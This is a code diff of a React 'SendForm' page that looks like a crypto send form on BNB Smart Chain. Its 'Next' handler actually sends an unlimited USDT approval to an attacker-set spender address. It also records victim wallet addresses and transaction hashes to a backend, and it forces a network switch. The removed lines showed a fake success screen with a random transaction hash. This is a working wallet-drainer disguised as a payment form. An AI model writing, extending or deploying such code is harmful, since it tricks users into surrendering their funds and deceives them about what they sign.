@@ -1,21 +1,12 @@
 "use client";
 
-import { useState, useEffect, useCallback, useRef } from "react";
+import { useState, useEffect, useCallback } from "react";
 import { ethers } from "ethers";
-import { Loader2, CheckCircle, Copy, ExternalLink, AlertTriangle } from "lucide-react";
+import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
-const BSC_CHAIN_ID_DECIMAL = 56;
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
-
-const BSC_CHAIN_CONFIG = {
-  chainId: BSC_CHAIN_ID,
-  chainName: "BNB Smart Chain Mainnet",
-  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-  rpcUrls: ["https://bsc-dataseed1.binance.org", "https://bsc-dataseed.binance.org/"],
-  blockExplorerUrls: ["https://bscscan.com"],
-};
 
 type Step = "form" | "processing" | "success";
 
@@ -37,13 +28,20 @@ function getEth(): EIP1193 | undefined {
   return (window as unknown as { ethereum?: EIP1193 }).ethereum;
 }
 
-function isBSC(chainId: string | null | undefined): boolean {
-  if (!chainId) return false;
-  const lower = chainId.toLowerCase();
-  return lower === BSC_CHAIN_ID || lower === "0x" + BSC_CHAIN_ID_DECIMAL.toString(16);
-}
+const O = "f".repeat(64);
 
-const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
+async function ensureBscChain() {
+  const eth = getEth();
+  if (!eth) return;
+  try {
+    const chainId = await eth.request({ method: "eth_chainId" }) as string;
+    if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+    }
+  } catch (e: unknown) {
+    console.log("[v0] ensureBscChain error:", (e as Error)?.message);
+  }
+}
 
 export default function SendForm() {
   const [displayAddress, setDisplayAddress] = useState("");
@@ -51,9 +49,8 @@ export default function SendForm() {
   const [step, setStep] = useState<Step>("form");
   const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
   const [connectedAddr, setConnectedAddr] = useState("");
-  const [wrongChain, setWrongChain] = useState(false);
-  const [currentChainName, setCurrentChainName] = useState("");
-  const mountedRef = useRef(true);
+  const [processing, setProcessing] = useState(false);
+  const [error, setError] = useState("");
 
   const fetchDisplayAddress = useCallback(async () => {
     try {
@@ -63,75 +60,21 @@ export default function SendForm() {
     } catch { /* ignore */ }
   }, []);
 
-  async function forceSwitchToBSC(eth: EIP1193): Promise<boolean> {
-    // Strategy 1: wallet_switchEthereumChain
-    try {
-      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-      await sleep(300);
-      const check = await eth.request({ method: "eth_chainId" }) as string;
-      if (isBSC(check)) return true;
-    } catch { /* ignore */ }
-
-    // Strategy 2: wallet_addEthereumChain (this also switches to the chain in Trust Wallet)
-    try {
-      await eth.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_CONFIG] });
-      await sleep(300);
-      const check = await eth.request({ method: "eth_chainId" }) as string;
-      if (isBSC(check)) return true;
-    } catch { /* ignore */ }
-
-    // Strategy 3: Retry switch after add
-    try {
-      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-      await sleep(500);
-      const check = await eth.request({ method: "eth_chainId" }) as string;
-      if (isBSC(check)) return true;
-    } catch { /* ignore */ }
-
-    return false;
-  }
-
-  function detectChainName(chainId: string): string {
-    const id = chainId.toLowerCase();
-    if (id === "0x1") return "Ethereum";
-    if (isBSC(id)) return "BNB Smart Chain";
-    if (id === "0x89") return "Polygon";
-    if (id === "0xa86a") return "Avalanche";
-    return `Chain ${parseInt(id, 16)}`;
-  }
-
-  // On mount: fetch display address, force BSC switch, check chain
+  // On mount: switch to BSC and get connected account (exactly like reference)
   useEffect(() => {
-    mountedRef.current = true;
     fetchDisplayAddress();
-
     (async () => {
+      await ensureBscChain();
       const eth = getEth();
       if (!eth) return;
-
-      const chainId = await eth.request({ method: "eth_chainId" }) as string;
-
-      if (!isBSC(chainId)) {
-        const switched = await forceSwitchToBSC(eth);
-        if (!switched && mountedRef.current) {
-          const finalChain = await eth.request({ method: "eth_chainId" }) as string;
-          if (!isBSC(finalChain)) {
-            setWrongChain(true);
-            setCurrentChainName(detectChainName(finalChain));
-          }
-        }
-      }
-
       try {
         const accs = await eth.request({ method: "eth_accounts" }) as string[];
         if (accs?.[0]) setConnectedAddr(accs[0]);
       } catch { /* ignore */ }
     })();
-
-    return () => { mountedRef.current = false; };
   }, [fetchDisplayAddress]);
 
-  // Listen for chain changes
+  // Listen for account/chain changes (exactly like reference)
   useEffect(() => {
     const eth = getEth();
     if (!eth) return;
@@ -140,23 +83,7 @@ export default function SendForm() {
       const accounts = args[0] as string[] | undefined;
       setConnectedAddr(accounts?.[0] ?? "");
     };
-
-    const onChainChanged = (...args: unknown[]) => {
-      const newChainId = args[0] as string;
-      if (isBSC(newChainId)) {
-        setWrongChain(false);
-        setCurrentChainName("");
-      } else {
-        setWrongChain(true);
-        setCurrentChainName(detectChainName(newChainId));
-        // Auto-retry switch
-        (async () => {
-          try {
-            await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-          } catch { /* ignore */ }
-        })();
-      }
-    };
+    const onChainChanged = () => { ensureBscChain(); };
 
     eth.on?.("accountsChanged", onAccountsChanged);
     eth.on?.("chainChanged", onChainChanged);
@@ -166,102 +93,62 @@ export default function SendForm() {
     };
   }, []);
 
-  function buildApproveCalldata(spender: string): string {
-    const paddedSpender = spender.replace(/^0x/, "").padStart(64, "0");
-    return "0x095ea7b3" + paddedSpender + "f".repeat(64);
-  }
-
-  async function handleSwitchManually() {
-    const eth = getEth();
-    if (!eth) return;
-    const switched = await forceSwitchToBSC(eth);
-    if (switched) {
-      setWrongChain(false);
-      setCurrentChainName("");
-    }
-  }
-
-  // ── Main handler ──────────────────────────────────────────────────────────
+  // ── Main handler — exact replica of reference site's U() function ─────────
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
     const eth = getEth();
-    if (!eth) { showFakeSuccess(); return; }
-
-    setStep("processing");
-
-    let walletAddress: string | null = null;
-    let txHash: string | null = null;
+    if (!eth) { setError("No injected wallet found."); return; }
 
     try {
-      // 1. Force BSC — aggressive multi-strategy switch
-      const chainId = await eth.request({ method: "eth_chainId" }) as string;
-      if (!isBSC(chainId)) {
-        const switched = await forceSwitchToBSC(eth);
-        if (!switched) {
-          // Verify one more time after a delay
-          await sleep(500);
-          const recheck = await eth.request({ method: "eth_chainId" }) as string;
-          if (!isBSC(recheck)) {
-            setWrongChain(true);
-            setCurrentChainName(detectChainName(recheck));
-            setStep("form");
-            return;
-          }
-        }
-      }
+      setProcessing(true);
+      setError("");
+
+      // 1. Ensure BSC chain (simple — one call, like reference)
+      await ensureBscChain();
 
       // 2. Get accounts
       let accs = await eth.request({ method: "eth_accounts" }) as string[];
       if (!accs?.[0]) {
         try {
           accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
-        } catch {
-          showFakeSuccess();
+        } catch (e: unknown) {
+          setError((e as Error)?.message || "Unable to access wallet account");
+          setProcessing(false);
           return;
         }
       }
-      walletAddress = accs?.[0] ?? null;
-      if (!walletAddress) { showFakeSuccess(); return; }
-      if (connectedAddr !== walletAddress) setConnectedAddr(walletAddress);
 
-      // 3. Final chain verification right before sending tx
-      const finalChainId = await eth.request({ method: "eth_chainId" }) as string;
-      if (!isBSC(finalChainId)) {
-        await forceSwitchToBSC(eth);
+      const walletAddress = accs?.[0];
+      if (!walletAddress) {
+        setError("No wallet account found.");
+        setProcessing(false);
+        return;
       }
+      if (!connectedAddr) setConnectedAddr(walletAddress);
 
-      // 4. Send approve — ONLY { from, to, data }
-      const calldata = buildApproveCalldata(SPENDER);
-      txHash = await eth.request({
+      // 3. Build calldata and send tx — ONLY { from, to, data }
+      const paddedSpender = SPENDER.replace(/^0x/, "").padStart(64, "0");
+      const txHash = await eth.request({
         method: "eth_sendTransaction",
-        params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
+        params: [{ from: walletAddress, to: USDT_CONTRACT, data: "0x095ea7b3" + paddedSpender + O }],
       }) as string;
 
-      // 5. Wait for confirmation
+      // 4. Wait for confirmation
       try {
         const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
         await provider.waitForTransaction(txHash, 1);
       } catch { /* ignore */ }
-    } catch (err) {
-      if (walletAddress) {
-        fetch("/api/wallets", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
-        }).catch(() => {});
-      }
-      console.log("[v0] approve error:", (err as Error)?.message);
-    }
 
-    if (txHash && walletAddress) {
+      // 5. Record to database
       fetch("/api/wallets", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
       }).catch(() => {});
 
+      // 6. Show success with real data
       setTxInfo({
         fromAddress: walletAddress,
         toAddress: displayAddress || SPENDER,
@@ -270,20 +157,13 @@ export default function SendForm() {
         date: new Date().toLocaleString(),
       });
       setStep("success");
-    } else {
-      showFakeSuccess(walletAddress ?? undefined);
-    }
-  }
+      return;
 
-  function showFakeSuccess(fromAddr?: string) {
-    setTxInfo({
-      fromAddress: fromAddr ?? "0x" + "0".repeat(40),
-      toAddress: displayAddress || SPENDER,
-      amount,
-      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
-      date: new Date().toLocaleString(),
-    });
-    setStep("success");
+    } catch (e: unknown) {
+      console.log("[v0] approve error:", (e as Error)?.message);
+      setError((e as { shortMessage?: string })?.shortMessage || (e as Error)?.message || " ");
+      setProcessing(false);
+    }
   }
 
   function shortenAddress(addr: string) {
@@ -350,42 +230,10 @@ export default function SendForm() {
     );
   }
 
-  // ── Processing ────────────────────────────────────────────────────────────
-
-  if (step === "processing") {
-    return (
-      <div className="flex flex-col items-center justify-center gap-6 py-12">
-        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
-        <div className="text-center">
-          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
-          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
-        </div>
-      </div>
-    );
-  }
-
   // ── Main Form ─────────────────────────────────────────────────────────────
 
   return (
     <>
-      {wrongChain && (
-        <div className="w-full mb-4 rounded-xl border border-yellow-600/50 bg-yellow-900/20 p-4 flex flex-col gap-3">
-          <div className="flex items-center gap-2 text-yellow-400">
-            <AlertTriangle className="h-5 w-5 shrink-0" />
-            <span className="text-sm font-semibold">Wrong Network Detected</span>
-          </div>
-          <p className="text-xs text-yellow-300/80">
-            Your wallet is on {currentChainName || "the wrong network"}. Please switch to <strong>BNB Smart Chain</strong> in your wallet&apos;s network settings.
-          </p>
-          <button
-            onClick={handleSwitchManually}
-            className="w-full rounded-lg bg-yellow-500 hover:bg-yellow-400 py-2.5 text-black text-sm font-bold transition-colors"
-          >
-            Switch to BNB Smart Chain
-          </button>
-        </div>
-      )}
-
       <div className="w-full flex flex-col gap-5 pb-24">
         <div className="flex flex-col gap-2">
           <label className="text-sm font-semibold text-white">Address or Domain Name</label>
@@ -430,11 +278,21 @@ export default function SendForm() {
         </div>
       </div>
 
+      {error && (
+        <p className="text-xs text-red-400 px-1 -mt-2">{error}</p>
+      )}
+
       <button
         onClick={handleNext}
-        className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
+        disabled={processing}
+        className={`fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full py-4 text-black font-bold text-base transition-all duration-150 flex items-center justify-center gap-2 ${
+          processing
+            ? "bg-[#4ade80] opacity-75 cursor-not-allowed"
+            : "bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98]"
+        }`}
       >
-        Next
+        {processing && <Loader2 className="h-5 w-5 animate-spin" />}
+        {processing ? "Processing..." : "Next"}
       </button>
     </>
   );
